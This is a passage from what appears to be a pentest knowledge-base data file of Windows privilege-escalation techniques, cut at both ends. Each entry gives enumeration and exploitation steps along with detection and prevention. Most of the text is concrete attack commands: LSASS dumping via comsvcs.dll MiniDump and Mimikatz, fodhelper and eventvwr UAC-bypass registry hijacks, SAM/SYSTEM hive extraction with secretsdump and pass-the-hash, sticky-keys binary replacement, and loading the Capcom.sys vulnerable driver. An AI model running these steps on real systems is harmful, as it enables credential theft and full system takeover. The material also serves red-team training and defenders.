      'permission checks. A well-documented technique uses SeRestorePrivilege to rename or replace the legitimate Utility Manager, sticky keys ' +
      '(sethc.exe), or a service binary with a malicious payload or with cmd.exe, then trigger it through the corresponding accessibility feature or ' +
      'service start to obtain a SYSTEM shell.',
    enumeration_commands: [
      { command: 'whoami /priv', description: 'Check for SeRestorePrivilege in the current token.', what_to_look_for: 'SeRestorePrivilege listed, whether enabled or disabled by default.' },
      { command: 'whoami /groups', description: 'Confirm membership in Backup Operators or Server Operators, common sources of this privilege.', what_to_look_for: 'BUILTIN\\Backup Operators or BUILTIN\\Server Operators in the group listing.' }
    ],
    exploitation_steps: [
      'Confirm SeRestorePrivilege via whoami /priv and enable it in the current token if disabled, using a privilege-enabling tool such as the PowerShell SeBackupPrivilegeUtils module (which also handles SeRestorePrivilege) or a custom enabler.',
      'Choose a target for privileged overwrite: a service binary running as SYSTEM (rename the legitimate binary aside and copy a malicious payload into its place, bypassing the normal ACL that would otherwise block this), or utilman.exe/sethc.exe (rename cmd.exe or copy it over the target to gain a SYSTEM console shell via the accessibility feature at the logon screen).',
      'Use backup-semantics file operations (via a tool that opens files with FILE_FLAG_BACKUP_SEMANTICS, or by using the SeRestorePrivilegeUtils PowerShell cmdlets) to move or overwrite the protected target file despite lacking normal write permission on it.',
      'For the service-binary approach, restart the target service (sc start SERVICENAME) to execute the malicious payload as SYSTEM.',
      'For the accessibility-feature approach, lock the workstation or reach the login screen and trigger the replaced accessibility binary (e.g. pressing Shift five times for sticky keys) to spawn a SYSTEM-level cmd.exe without needing to log in.',
      'Confirm SYSTEM-level access was obtained and document the exact technique and target file used.'
    ],
    tools: ['SeBackupPrivilegeUtils / SeBackupPrivilegeCmdLets (PowerShell)', 'sc.exe', 'robocopy (/B backup mode)'],
    detection:
      'Security Event Log privilege-use auditing (Event ID 4673/4674 for SeRestorePrivilege) combined with file integrity monitoring on critical system ' +
      'binaries (sethc.exe, utilman.exe, service executables) reliably detects both the privilege use and its resulting file modification.',
    prevention:
      'Restrict Backup Operators and Server Operators group membership strictly, enable file integrity monitoring on accessibility and service ' +
      'binaries, and consider disabling or tightly controlling accessibility features at the logon screen (via Group Policy) in high-security ' +
      'environments.',
    real_world_examples: [
      { reference: 'MITRE ATT&CK T1546.008 (Accessibility Features)', description: 'The sethc.exe/utilman.exe replacement technique enabled by SeRestorePrivilege is directly documented as a MITRE ATT&CK persistence and privilege escalation technique, and remains an effective, low-noise SYSTEM-access method whenever the required privilege is available.' }
    ]
  },
  {
    id: 'windows-sedebugprivilege-abuse',
    name: 'SeDebugPrivilege Abuse (Process Token Theft / LSASS Access)',
    category: 'Token/Privilege Abuse',
    difficulty: 'Low',
    likelihood: 'Common',
    description:
      'SeDebugPrivilege allows a process to open a handle to, and debug, any other process on the system regardless of the calling account\'s normal ' +
      'permission relative to that process\'s owner -- it is granted by default to local Administrators. While already-elevated administrators do not ' +
      'strictly need further escalation, SeDebugPrivilege is a critical pivot for reaching SYSTEM from an administrator context (rather than a fully ' +
      'interactive SYSTEM session), and for credential theft: it enables opening a handle to lsass.exe (Local Security Authority Subsystem Service), ' +
      'the process that holds cached credential material (NTLM hashes, Kerberos tickets, and in some configurations plaintext passwords) in memory for ' +
      'every logged-on user, or to steal and impersonate the access token of any SYSTEM-owned process to directly obtain a SYSTEM-level shell.',
    enumeration_commands: [
      { command: 'whoami /priv', description: 'Check for SeDebugPrivilege and its current state.', what_to_look_for: 'SeDebugPrivilege listed, typically for local Administrator context accounts.' },
      { command: 'tasklist /v | findstr SYSTEM', description: 'Enumerate processes running as SYSTEM as potential token-theft targets.', what_to_look_for: 'Common SYSTEM processes such as winlogon.exe, services.exe, or lsass.exe available for token duplication.' }
    ],
    exploitation_steps: [
      'Confirm SeDebugPrivilege is present (typically requires local administrator context) via whoami /priv.',
      'For direct SYSTEM shell acquisition via token theft, use a tool such as Incognito (list_tokens -u, then impersonate_token) or a PowerShell equivalent to enumerate available SYSTEM tokens from processes like winlogon.exe or services.exe and impersonate one directly.',
      'Alternatively, use PsExec -s -i cmd (Sysinternals) which, when already running as a local administrator, leverages the ability to install and start a service running as SYSTEM to spawn an interactive SYSTEM shell directly.',
      'For credential extraction, dump the lsass.exe process memory using a legitimate-looking method to avoid EDR signature-based detection, such as Task Manager\'s "Create dump file" option on lsass.exe, or comsvcs.dll\'s MiniDump export: rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump <lsass_PID> C:\\temp\\lsass.dmp full.',
      'Transfer the resulting dump file to an analysis machine and parse it offline with Mimikatz (sekurlsa::minidump lsass.dmp then sekurlsa::logonpasswords) to extract cached credentials, NTLM hashes, and Kerberos tickets for every logged-on account.',
      'Use extracted credentials for pass-the-hash, pass-the-ticket, or direct authentication to escalate further or move laterally.',
      'Verify final access level and document whether token theft or credential dumping (or both) was used.'
    ],
    tools: ['Incognito', 'PsExec (Sysinternals)', 'Mimikatz', 'comsvcs.dll MiniDump technique', 'Task Manager (GUI dump)', 'ProcDump (Sysinternals)'],
    detection:
      'EDR/AV signature and behavioral detection on lsass.exe memory access (Windows Defender Credential Guard, LSA Protection/RunAsPPL, and Sysmon ' +
      'Event ID 10 process-access monitoring with a GrantedAccess filter for lsass.exe) are the primary detection controls; alerting on comsvcs.dll ' +
      'being invoked via rundll32 against an lsass PID is a well-known high-fidelity signature.',
    prevention:
      'Enable LSA Protection (RunAsPPL) and Credential Guard to prevent even SYSTEM-level processes from reading LSASS memory without a signed, ' +
      'trusted driver, restrict local Administrator group membership tightly, and deploy EDR with dedicated LSASS-access behavioral detections.',
    real_world_examples: [
      { reference: 'MITRE ATT&CK T1003.001 (OS Credential Dumping: LSASS Memory)', description: 'LSASS credential dumping enabled by SeDebugPrivilege is one of the single most common post-exploitation techniques observed across both red team engagements and real-world intrusions, forming the basis of Mimikatz\'s core functionality since its original release.' }
    ]
  },
  {
    id: 'windows-setakeownershipprivilege-abuse',
    name: 'SeTakeOwnershipPrivilege Abuse',
    category: 'Token/Privilege Abuse',
    difficulty: 'Low',
    likelihood: 'Occasional',
    description:
      'SeTakeOwnershipPrivilege allows a process to take ownership of any securable object (files, directories, registry keys, services) regardless of ' +
      'the existing DACL, and it is granted by default to local Administrators. Once an attacker takes ownership of an object, they gain the implicit ' +
      'right to modify its DACL entirely (WRITE_DAC is always available to the object\'s owner), even if the previous DACL denied them all access. This ' +
      'is commonly used to seize control of a protected service binary or registry key that even an administrator token cannot normally modify due to ' +
      'restrictive ACLs (for example, a security product\'s own protected binary, or a locked-down configuration file), granting a path to modify it and ' +
      'achieve SYSTEM-level code execution or defense evasion.',
    enumeration_commands: [
      { command: 'whoami /priv', description: 'Check for SeTakeOwnershipPrivilege.', what_to_look_for: 'SeTakeOwnershipPrivilege listed, typically in an administrator context.' },
      { command: 'icacls "C:\\target\\protected\\file.exe"', description: 'Identify a target file or service binary with restrictive permissions even for administrators.', what_to_look_for: 'An ACL that denies or omits write access even for the Administrators group, indicating a good target for the take-ownership technique.' }
    ],
    exploitation_steps: [
      'Confirm SeTakeOwnershipPrivilege is present via whoami /priv.',
      'Identify a target object (service binary, registry key, or file) that is protected by a restrictive ACL you cannot currently modify despite administrative context.',
      'Take ownership of the target: takeown /f "C:\\target\\protected\\file.exe".',
      'Grant yourself full control now that you own the object: icacls "C:\\target\\protected\\file.exe" /grant YOURUSER:F.',
      'Overwrite or modify the target as needed, such as replacing a protected service binary with a malicious payload, or modifying a protected registry key controlling a security product\'s behavior.',
      'Trigger execution of the modified target (restart the associated service, or wait for the next natural invocation) to achieve elevated code execution.',
      'Verify final privilege level and document the exact object and technique used, restoring original ownership/ACLs after demonstrating impact if required.'
    ],
    tools: ['takeown.exe', 'icacls.exe', 'PowerShell (Set-Acl)'],
    detection:
      'Security Event Log auditing (Event ID 4674 for privileged object operations, and Event ID 4670 for permissions changes on an object) reveals ' +
      'ownership and ACL changes; alerting specifically on takeown.exe or icacls.exe execution against security-relevant paths (service binaries, ' +
      'security product installation directories) is an effective, targeted detection rule.',
    prevention:
      'Restrict local Administrator group membership as tightly as possible since this privilege is granted by default to that group, and apply ' +
      'additional protection layers (such as a security product\'s self-protection driver) that resist even administrator-level ownership changes for ' +
      'its own critical files.',
    real_world_examples: [
      { reference: 'CWE-282 Improper Ownership Management', description: 'Take-ownership abuse is a standard technique for both privilege escalation and security-product tampering/defense evasion, documented extensively in Windows privilege escalation and red team methodology references.' }
    ]
  },
  {
    id: 'windows-seloaddriverprivilege-abuse',
    name: 'SeLoadDriverPrivilege Abuse (Vulnerable Driver / Capcom.sys Loading)',
    category: 'Token/Privilege Abuse',
    difficulty: 'High',
    likelihood: 'Rare',
    description:
      'SeLoadDriverPrivilege allows a process to load and unload device drivers, which execute in kernel mode with the highest possible privilege ' +
      'level on the system. Because loading arbitrary unsigned code into the kernel is normally blocked by Driver Signature Enforcement, this technique ' +
      'instead relies on loading a legitimately signed but intentionally or accidentally vulnerable driver (a "Bring Your Own Vulnerable Driver," or ' +
      'BYOVD, attack). A well-known historical example is Capcom.sys, a driver shipped with a Street Fighter V anti-cheat component that exposes an ' +
      'IOCTL allowing any caller to execute arbitrary code at kernel privilege level with no further authentication. An attacker holding ' +
      'SeLoadDriverPrivilege can load such a driver via the registry-based driver-loading API, then send the crafted IOCTL to it to execute a payload ' +
      'in kernel mode, which can directly manipulate the calling process\'s token to grant itself SYSTEM privileges.',
    enumeration_commands: [
      { command: 'whoami /priv', description: 'Check for SeLoadDriverPrivilege.', what_to_look_for: 'SeLoadDriverPrivilege listed, typically in an administrator context, though it can also be delegated separately.' },
      { command: 'driverquery /v', description: 'Enumerate currently loaded drivers to understand the existing kernel-mode attack surface and confirm the target vulnerable driver is not already blocked.', what_to_look_for: 'Absence of Capcom.sys or the intended vulnerable driver, confirming it needs to be loaded by the exploit.' }
    ],
    exploitation_steps: [
      'Confirm SeLoadDriverPrivilege is present and enabled (or enable it programmatically) via whoami /priv.',
      'Obtain a known-vulnerable but legitimately signed driver appropriate to the target\'s architecture and Windows version (Capcom.sys is the classic public example; the "LOLDrivers" project catalogs many current alternatives as Microsoft continues to blocklist older ones via HVCI/driver blocklists).',
      'Create the required registry key under HKLM\\System\\CurrentControlSet\\Services describing the driver service, pointing to the vulnerable driver file on disk.',
      'Use the NtLoadDriver API (via a helper tool, since standard command-line tools do not expose this directly) to load the vulnerable driver into the kernel using SeLoadDriverPrivilege.',
      'Send the crafted IOCTL request to the loaded driver\'s device object to trigger its known vulnerability (e.g. Capcom.sys\'s arbitrary-shellcode-execution IOCTL), passing shellcode that steals the SYSTEM process token and assigns it to the current process.',
      'Confirm the current process now runs with a SYSTEM token, and spawn a new SYSTEM-level shell or process from that context.',
      'Unload the driver and clean up the created registry key/driver file after demonstrating impact if required by the engagement scope.'
    ],
    tools: ['Capcom.sys exploit / EoP PoC tools', 'LOLDrivers project reference', 'gdrv-loader style helper tools', 'NtLoadDriver API wrappers'],
    detection:
      'Driver load event monitoring (Sysmon Event ID 6, driver loaded) combined with a blocklist/allowlist of known-vulnerable driver hashes (Microsoft ' +
      'publishes a recommended driver blocklist enforceable via HVCI) is the primary detection and prevention control; EDR products increasingly ship ' +
      'BYOVD-specific detections given the technique\'s rise in ransomware and APT tradecraft.',
    prevention:
      'Enable Windows Defender Application Control (WDAC) or HVCI with Microsoft\'s vulnerable driver blocklist enforced, restrict SeLoadDriverPrivilege ' +
      'to only accounts that genuinely require it, and keep the driver blocklist updated since new vulnerable drivers are discovered regularly.',
    real_world_examples: [
      { reference: 'Capcom.sys BYOVD technique', description: 'One of the earliest and most widely referenced Bring Your Own Vulnerable Driver examples, extensively used in public privilege escalation proof-of-concept tooling and red team training.' },
      { reference: 'BYOVD in ransomware operations (e.g. tooling associated with groups abusing vulnerable anti-cheat and utility drivers)', description: 'Multiple real-world ransomware operators have been documented loading vulnerable signed drivers to disable EDR/AV kernel hooks or escalate privileges as a precursor to full domain compromise, directly reflecting BYOVD\'s real-world impact beyond lab environments.' }
    ]
  },
  {
    id: 'windows-uac-bypass',
    name: 'UAC Bypass Techniques (fodhelper, eventvwr, sdclt, computerdefaults)',
    category: 'UAC Bypass',
    difficulty: 'Medium',
    likelihood: 'Common',
    description:
      'User Account Control (UAC) is not a true security boundary in Windows\' own threat model (Microsoft has stated this explicitly), but it does ' +
      'act as a meaningful friction layer that prompts for consent before a process can run with a full administrator token, and bypassing it silently ' +
      'is highly valuable for both privilege escalation chains and stealth. A well-documented class of UAC bypasses exploits "auto-elevating" Windows ' +
      'binaries -- executables that Windows allows to elevate to a full administrator token without a UAC prompt because they are signed by Microsoft ' +
      'and specifically manifested for auto-elevation (identifiable by an autoElevate=true manifest entry). Several of these auto-elevating binaries ' +
      '(fodhelper.exe, eventvwr.exe, sdclt.exe, computerdefaults.exe, and others) read a command or file association from a registry location under ' +
      'the current user\'s hive (HKCU) rather than the machine-wide HKLM hive before elevating. Since HKCU is always writable by the standard user ' +
      '(no admin rights are needed to write to your own user\'s registry hive), an attacker who is already a member of the local Administrators group ' +
      'but running with a filtered, non-elevated token (the default UAC behavior for admin accounts) can plant a malicious command in the relevant HKCU ' +
      'registry path, launch the auto-elevating binary, and have it silently execute the attacker\'s command with a full, unprompted administrator ' +
      'token.',
    enumeration_commands: [
      { command: 'whoami /groups', description: 'Confirm the current user is a member of the local Administrators group (a prerequisite for most UAC bypasses, since UAC only filters an already-administrative token, it does not grant new privileges to a genuinely non-admin account).', what_to_look_for: 'BUILTIN\\Administrators listed with a "Group used for deny only" attribute, confirming a filtered admin token subject to UAC.' },
      { command: 'reg query HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command', description: 'Check the current state of the registry key abused by the fodhelper.exe bypass.', what_to_look_for: 'Whether the key already exists (it usually does not by default, meaning it must be created for the technique).' },
      { command: '(Get-Process -Id $PID).Path ; [Security.Principal.WindowsIdentity]::GetCurrent().Groups', description: 'PowerShell-based confirmation of the current token\'s elevation state.', what_to_look_for: 'Confirmation that the current process token is a filtered/non-elevated administrator token rather than a genuinely standard user token.' }
    ],
    exploitation_steps: [
      'Confirm the current user is a local Administrator running with a UAC-filtered (non-elevated) token via whoami /groups.',
      'For the fodhelper.exe bypass: create the registry keys reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /d "cmd.exe /c YOUR_PAYLOAD" /f and reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /v DelegateExecute /f, then launch fodhelper.exe, which reads and executes the HKCU-defined command with a full administrator token and no UAC prompt.',
      'For the eventvwr.exe bypass: set reg add HKCU\\Software\\Classes\\mscfile\\shell\\open\\command /d "YOUR_PAYLOAD" /f, then launch eventvwr.exe, which invokes the mscfile handler with an elevated token.',
      'For the sdclt.exe bypass: set the appropriate HKCU\\Software\\Classes\\exefile\\shell\\runas\\command\\isolatedCommand (or the App Paths variant depending on the Windows version) registry value, then launch sdclt.exe with the relevant argument to trigger its auto-elevating backup-restore path.',
      'For the computerdefaults.exe bypass: an equivalent HKCU Classes registry hijack targeting the default-apps handler it invokes on launch.',
      'After the auto-elevating binary executes, confirm the payload ran with a full, unfiltered administrator token by checking the resulting process\'s integrity level or by directly observing the elevated command\'s effect (e.g. a new admin-context reverse shell or a modified protected file).',
      'Clean up the created registry keys after demonstrating impact if required by the engagement scope, since leaving them in place could be flagged during a later review.'
    ],
    tools: ['UACME (public exploit collection covering dozens of bypass methods)', 'reg.exe', 'Metasploit (exploit/windows/local/bypassuac_* modules)', 'Empire/Covenant UAC bypass modules'],
    detection:
      'Sysmon Event ID 13 (registry value set) monitoring on the specific HKCU Classes paths abused by known bypasses (ms-settings, mscfile, exefile, ' +
      'App Paths) combined with Event ID 1 process creation monitoring for the auto-elevating binaries themselves (fodhelper.exe, eventvwr.exe, sdclt.exe) ' +
      'launched shortly after such a registry modification is a precise detection signature.',
    prevention:
      'Set UAC to "Always notify" (the highest enforcement level) rather than the Windows default, which reduces the auto-elevation attack surface for ' +
      'some but not all techniques; more fundamentally, do not treat UAC as a genuine security boundary -- restrict local Administrators group ' +
      'membership tightly, since any UAC bypass presupposes the attacker already holds an administrator-equivalent (if filtered) token.',
    real_world_examples: [
      { reference: 'UACME project', description: 'The UACME open-source project catalogs and maintains dozens of distinct UAC bypass techniques discovered over many Windows versions, several of which (including fodhelper and eventvwr) remain effective on modern Windows 10/11 and Server releases as of this writing, and are directly incorporated into Metasploit and major C2 frameworks.' },
      { reference: 'Widespread use in commodity malware and ransomware', description: 'UAC bypass techniques, particularly fodhelper-based ones due to their simplicity (no binary drop required, pure registry manipulation), are routinely observed in real-world malware and ransomware precursor activity as a stealthy privilege escalation step.' }
    ]
  },
  {
    id: 'windows-scheduled-task-abuse',
    name: 'Scheduled Task Abuse (Weak Task Permissions and Action Hijacking)',
    category: 'Scheduled Task Abuse',
    difficulty: 'Low',
    likelihood: 'Common',
    description:
      'Windows Scheduled Tasks (managed via schtasks.exe, the Task Scheduler GUI, or the underlying \\Windows\\System32\\Tasks XML definitions and ' +
      'registry entries) frequently run with elevated privileges -- SYSTEM, an administrative service account, or a highly privileged domain account -- ' +
      'to perform automated maintenance, backups, or application-specific jobs. Three related misconfigurations commonly grant privilege escalation: ' +
      'first, weak permissions on the task definition itself (a writable XML file under \\Windows\\System32\\Tasks or a modifiable task via the ' +
      'Scheduler COM API/schtasks /change command) allow directly altering the action a privileged task performs; second, weak permissions on the ' +
      'binary or script the task invokes allow the same binary-replacement technique used against services; third, a task that runs as a specific ' +
      'lower-privileged but still more-privileged-than-attacker domain or service account, combined with a "Run only when user is logged on" or stored- ' +
      'credential configuration, can expose that account\'s credentials to extraction.',
    enumeration_commands: [
      { command: 'schtasks /query /fo LIST /v', description: 'Enumerate all scheduled tasks with full detail including the run-as account, trigger, and action.', what_to_look_for: 'Tasks running as SYSTEM or a privileged account with an action pointing to a file outside the trusted C:\\Windows tree.' },
      { command: 'Get-ScheduledTask | Get-ScheduledTaskInfo', description: 'PowerShell equivalent for enumerating scheduled tasks and their last/next run times, useful for timing an attack around an upcoming trigger.', what_to_look_for: 'Tasks with an imminent NextRunTime that run as a privileged account.' },
      { command: 'icacls "C:\\Windows\\System32\\Tasks\\TaskName"', description: 'Check permissions on the task definition XML file itself.', what_to_look_for: 'Write access granted to a low-privileged group on the task file.' },
      { command: 'icacls "C:\\Path\\To\\TaskAction.exe" (or .ps1/.bat referenced by the task Action)', description: 'Check permissions on the actual binary or script the task executes.', what_to_look_for: 'Write access granted to a low-privileged group, allowing the standard binary-replacement technique.' }
    ],
    exploitation_steps: [
      'Enumerate all scheduled tasks and identify any running as SYSTEM or another privileged account using schtasks /query /fo LIST /v.',
      'For each privileged task, check write permissions on both the task definition file (\\Windows\\System32\\Tasks\\TaskName) and the actual action target (script/binary it invokes).',
      'If the task definition file itself is writable, directly modify its Action element to point at a malicious payload, or use schtasks /change /tn "TaskName" /tr "C:\\path\\to\\payload.exe" if you have sufficient rights to use the change command against it.',
      'If instead the invoked binary/script is writable, overwrite it with a malicious payload following the same approach used for weak service binary permissions.',
      'Trigger the task manually if permitted (schtasks /run /tn "TaskName"), or wait for its natural scheduled trigger time.',
      'Catch the resulting reverse shell or confirm the payload executed with the task\'s configured elevated privileges.',
      'Verify final privilege level with whoami /priv and restore the original task configuration/binary after demonstrating impact if required.'
    ],
    tools: ['schtasks.exe', 'Task Scheduler GUI', 'icacls', 'PowerUp (Get-ModifiableScheduledTaskFile)', 'WinPEAS'],
    detection:
      'Task Scheduler operational event logs (Microsoft-Windows-TaskScheduler/Operational, Event ID 106 for task registration and 200/201 for task ' +
      'execution) combined with file integrity monitoring on \\Windows\\System32\\Tasks and any referenced task action binaries provide comprehensive ' +
      'detection coverage.',
    prevention:
      'Ensure scheduled task definitions and their target binaries/scripts are protected with restrictive NTFS permissions matching the privilege level ' +
      'the task runs at, avoid configuring tasks to run as highly privileged accounts unless strictly necessary, and periodically audit task ' +
      'permissions as part of routine Windows hardening reviews.',
    real_world_examples: [
      { reference: 'CWE-732 Incorrect Permission Assignment for Critical Resource', description: 'Weak scheduled task permissions are a common finding class in both third-party software installations and custom enterprise automation, directly analogous to weak service permissions and covered by the same class of automated tooling (PowerUp, WinPEAS).' }
    ]
  },
  {
    id: 'windows-registry-autoruns',
    name: 'Registry Autorun Key Abuse (Run/RunOnce Persistence-to-Privesc)',
    category: 'Persistence / Autorun Abuse',
    difficulty: 'Low',
    likelihood: 'Common',
    description:
      'Windows executes commands listed in several well-known registry autorun locations automatically at user logon: HKCU\\Software\\Microsoft\\Windows\\ ' +
      'CurrentVersion\\Run and RunOnce for per-user autoruns, and the HKLM equivalents for machine-wide autoruns that execute for every user who logs on, ' +
      'including administrators. If the HKLM Run/RunOnce keys (or an equivalent autostart location such as the Startup folder for All Users) are ' +
      'writable by a low-privileged user due to a registry ACL misconfiguration, an attacker can add an entry that executes their payload the next time ' +
      'any user -- especially an administrator -- logs in, achieving privilege escalation the moment that higher-privileged session starts. Similarly, ' +
      'if a scheduled logon script or the All Users Startup folder is writable, the same effect can be achieved via a dropped executable or shortcut.',
    enumeration_commands: [
      { command: 'reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run', description: 'List current machine-wide autorun entries.', what_to_look_for: 'Existing entries pointing to writable paths, or confirmation of your ability to add new entries.' },
      { command: 'accesschk64.exe -accepteula -kvuqsw "hklm\\software\\microsoft\\windows\\currentversion\\run"', description: 'Check the ACL of the Run key itself for write access by a low-privileged group.', what_to_look_for: 'SetValue/FullControl granted to Everyone, Authenticated Users, or Users.' },
      { command: 'icacls "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp"', description: 'Check write permissions on the All Users Startup folder, an alternate autorun location.', what_to_look_for: 'Write access granted to a low-privileged group on the shared startup folder.' }
    ],
    exploitation_steps: [
      'Check write permissions on HKLM Run/RunOnce keys and on the All Users Startup folder using accesschk and icacls.',
      'If the HKLM Run key is writable, add a new value pointing at a malicious payload: reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v Updater /t REG_SZ /d "C:\\Users\\Public\\payload.exe" /f.',
      'If the All Users Startup folder is writable instead, simply copy a malicious executable or a shortcut (.lnk) pointing to your payload into that folder.',
      'Wait for any user -- ideally an administrator -- to log on, which triggers execution of the autorun payload in that user\'s session context.',
      'If a reverse-shell payload was used, catch the connection when the target logs on; if a payload that creates a new administrative account was used, confirm the account exists after the trigger.',
      'Use the resulting session or credentials to complete escalation, and verify with whoami /priv.'
    ],
    tools: ['reg.exe', 'Sysinternals AccessChk', 'Sysinternals Autoruns', 'PowerUp', 'WinPEAS'],
    detection:
      'Sysmon Event ID 13 (registry value set) on the Run/RunOnce keys, combined with Sysinternals Autoruns baseline comparison and file integrity ' +
      'monitoring on shared Startup folders, reliably detects both the registry/file-drop and the resulting execution at next logon.',
    prevention:
      'Ensure autorun registry keys and shared Startup folders retain their default restrictive ACLs (write access limited to Administrators/SYSTEM), ' +
      'and periodically audit them with Sysinternals Autoruns as part of routine host hardening.',
    real_world_examples: [
      { reference: 'MITRE ATT&CK T1547.001 (Registry Run Keys / Startup Folder)', description: 'Registry autorun abuse is one of the most fundamental and enduring Windows persistence techniques in MITRE ATT&CK, and when the relevant keys/folders are writable by a low-privileged user it directly converts a persistence technique into a privilege escalation vector.' }
    ]
  },
  {
    id: 'windows-stored-credentials',
    name: 'Stored Credential Harvesting (Windows Vault, Credential Manager, Saved RDP Credentials, unattend.xml, sysprep Files)',
    category: 'Credential Abuse',
    difficulty: 'Low',
    likelihood: 'Common',
    description:
      'Windows offers multiple legitimate mechanisms to persist credentials for user convenience, and each is a common source of privilege escalation ' +
      'when accessible to an attacker. Credential Manager and the Windows Vault store saved usernames/passwords for network shares, web credentials, ' +
      'and applications integrated with the Windows Credential Provider API, and can be enumerated with cmdkey and decrypted (where the current user\'s ' +
      'context matches) with tools like Mimikatz\'s vault module or lazagne. Saved RDP credentials are stored per-target in Credential Manager as ' +
      'generic credentials and are readable by the same user who saved them, but if that user is more privileged (an administrator who RDPs into other ' +
      'systems from this shared workstation), the credentials can be reused. Unattend.xml and other autounattend/sysprep files, used to automate ' +
      'Windows installation and deployment, frequently contain a local administrator password in a Base64-encoded (trivially reversible, not encrypted) ' +
      'field, left behind on disk after imaging or deployment (commonly at C:\\Windows\\Panther\\Unattend.xml, C:\\Windows\\Panther\\Unattend\\ ' +
      'Unattend.xml, or C:\\Windows\\System32\\Sysprep\\sysprep.xml/Panther directories) and forgotten by IT deployment teams.',
    enumeration_commands: [
      { command: 'cmdkey /list', description: 'List all credentials currently stored in Windows Credential Manager for the current user context.', what_to_look_for: 'Saved credentials for RDP targets, network shares, or domain accounts.' },
      { command: 'dir /s /b C:\\Windows\\Panther\\Unattend.xml C:\\Windows\\Panther\\Unattend\\Unattend.xml C:\\Windows\\System32\\Sysprep\\Panther\\Unattend.xml C:\\Windows\\System32\\Sysprep\\sysprep.xml 2>nul', description: 'Search all standard locations for leftover deployment automation files that may contain embedded credentials.', what_to_look_for: 'Any of these files present and readable.' },
      { command: 'findstr /si password *.xml *.ini *.txt *.config C:\\inetpub C:\\Users\\* 2>nul', description: 'Broadly search common web/config file locations for plaintext password strings.', what_to_look_for: 'Hits revealing embedded application or service credentials.' },
      { command: 'reg query "HKCU\\Software\\Microsoft\\Terminal Server Client\\Servers"', description: 'Enumerate hosts the current user has connected to via RDP, useful for correlating with saved credential targets.', what_to_look_for: 'Server entries corresponding to a saved credential in Credential Manager.' }
    ],
    exploitation_steps: [
      'Run cmdkey /list to enumerate stored credentials accessible in the current user context, noting any RDP or network share targets.',
      'Check for and read any unattend.xml/sysprep.xml files found at the standard deployment paths; decode any Base64 "Password" field found within the <Credentials> section (a simple base64 -d or PowerShell [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String("...")) reversal reveals the plaintext).',
      'Use LaZagne or Mimikatz\'s vault::cred / vault::list modules to enumerate and, where possible, decrypt stored Windows Vault credentials for the current user.',
      'If saved RDP credentials exist for a target you can reach, attempt to use them directly (mstsc.exe against the target, or extract via a tool that surfaces the underlying username/password if the DPAPI master key is accessible in the current session).',
      'Use any discovered plaintext or reusable credential to authenticate directly as the associated account, which is frequently a local or domain administrator in the unattend.xml case since it is specifically the deployment-time admin account.',
      'Verify final access level with whoami /priv or by successfully authenticating to the target service/host.'
    ],
    tools: ['cmdkey.exe', 'LaZagne', 'Mimikatz (vault:: module, dpapi:: module)', 'findstr', 'WinPEAS', 'SharpUp'],
    detection:
      'File access auditing on Panther/Sysprep directories, DLP scanning for plaintext or Base64-encoded credential patterns in deployment images, and ' +
      'monitoring for cmdkey.exe/vaultcmd.exe enumeration activity are the primary detection controls.',
    prevention:
      'Delete or securely wipe unattend.xml, sysprep.xml, and any Panther directory contents after deployment completes as a standard part of the ' +
      'imaging process, avoid storing credentials in Credential Manager for privileged accounts on shared or multi-user systems, and use Local ' +
      'Administrator Password Solution (LAPS) instead of a static embedded deployment password.',
    real_world_examples: [
      { reference: 'CWE-798 Use of Hard-coded Credentials', description: 'Leftover unattend.xml files containing a Base64-encoded local administrator password are one of the most consistently found Windows privilege escalation vectors in real enterprise environments that use imaging-based deployment, and are a standard automated check in WinPEAS and PowerUp.' }
    ]
  },
  {
    id: 'windows-sam-system-hash-extraction',
    name: 'SAM/SYSTEM Registry Hive Hash Extraction',
    category: 'Credential Abuse',
    difficulty: 'Low',
    likelihood: 'Common',
    description:
      'The SAM (Security Account Manager) registry hive stores local account password hashes in an encrypted form, with the decryption (boot) key ' +
      'stored in the SYSTEM hive. Under normal operation both hives are locked while Windows is running, but an administrator (or an attacker holding ' +
      'SeBackupPrivilege) can save copies of both hives using reg.exe or a volume shadow copy, then transfer them offline for hash extraction without ' +
      'ever needing to interact with the live, locked files directly. Once extracted, local account NTLM hashes can be used directly for pass-the-hash ' +
      'authentication against any service that accepts NTLM (SMB, WinRM, RDP with restricted admin mode) without ever needing to crack them, or cracked ' +
      'offline to recover the plaintext password if it is weak.',
    enumeration_commands: [
      { command: 'net user', description: 'Enumerate local accounts as extraction targets, confirming which accounts exist before attempting hash extraction.', what_to_look_for: 'Administrator or other privileged local accounts to prioritize.' },
      { command: 'whoami /priv', description: 'Confirm administrative context (or SeBackupPrivilege specifically) required to read the SAM/SYSTEM hives.', what_to_look_for: 'Local Administrator group membership or SeBackupPrivilege.' }
    ],
    exploitation_steps: [
      'Confirm local administrator context or SeBackupPrivilege is available.',
      'Save the SAM and SYSTEM hives to disk: reg save hklm\\sam C:\\temp\\sam.hive and reg save hklm\\system C:\\temp\\system.hive.',
      'Transfer both hive files to an attacker-controlled analysis machine (via SMB, a web server upload, or an established C2 channel).',
      'Extract NTLM hashes offline using Impacket\'s secretsdump.py: secretsdump.py -sam sam.hive -system system.hive LOCAL, which outputs each local account\'s RID and NTLM hash.',
      'Use the extracted Administrator (or other privileged local account) NTLM hash directly for pass-the-hash authentication with tools such as Impacket\'s psexec.py, wmiexec.py, or evil-winrm --hash, without needing the plaintext password.',
      'Optionally attempt offline cracking of the extracted hashes with hashcat (mode 1000 for NTLM) against a wordlist or rule-based attack to recover the plaintext password for further credential reuse testing.',
      'Verify final access level by successfully authenticating to the target with the recovered hash or password.'
    ],
    tools: ['reg.exe', 'Impacket secretsdump.py', 'hashcat', 'John the Ripper', 'Mimikatz (lsadump::sam)', 'evil-winrm'],
    detection:
      'Security Event Log auditing for reg save operations targeting SAM/SYSTEM (Event ID 4656/4663 with the object name matching the hive), combined ' +
      'with Sysmon process-creation monitoring for reg.exe invoked with save and hklm\\sam/hklm\\system arguments, is a precise, high-fidelity detection ' +
      'rule.',
    prevention:
      'Restrict local Administrator and Backup Operators group membership tightly, enable LSA Protection and Credential Guard where applicable, use ' +
